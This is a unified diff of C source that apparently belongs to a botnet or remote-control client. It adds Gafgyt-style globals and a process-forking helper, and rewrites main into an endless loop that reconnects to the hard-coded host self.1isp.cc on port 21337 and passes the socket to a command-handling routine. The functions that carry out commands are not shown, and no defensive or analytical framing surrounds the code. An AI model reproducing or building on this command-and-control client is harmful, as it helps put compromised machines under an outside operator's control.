@@ -14,27 +14,50 @@
 #include <stdlib.h>
 #include <string.h>
 #include <unistd.h>
+#include <fcntl.h>
+
+int mainCommSock = 0;
+char *server = "self.1isp.cc";
+int port = 21337;
+uint32_t *pids;
+uint64_t numpids = 0;
+extern char uuid[32];
+
+int listFork()
+{
+	uint32_t parent, *newpids, i;
+	parent = fork();
+	if (parent <= 0) return parent;
+	numpids++;
+	newpids = (uint32_t*)malloc((numpids + 1) * 4);
+	for (i = 0; i < numpids - 1; i++) newpids[i] = pids[i];
+	newpids[numpids - 1] = parent;
+	free(pids);
+	pids = newpids;
+	return parent;
+}
 
 int main(int argc, char **argv)
 {
-    int fd, n = 0;
-
     generate_uuid();
 
-    daemonize();
+    //daemonize();
     while ( 1 )
     {
-        fd = connect_tcp_server("self.1isp.cc", 21337);
-        if ( ask_for_service( fd ) == -1 )
+		if( (mainCommSock=connect_tcp_server(server, port)) == -1)
+        { 
+            printf("Failed to connect...\n"); sleep(5); continue; 
+        }
+        if ( ask_for_service( mainCommSock ) == -1 )  // return from this function means connection between client
+                                                      // and server are unexpectedly closed
         {
             fprintf(stdout, "error in client\n");
         }
         
-        if ( check_fd(fd) )
+        if ( check_fd(mainCommSock) )
         {
-            close(fd);
+            close(mainCommSock);
         }
-
         sleep(3);
     }
 
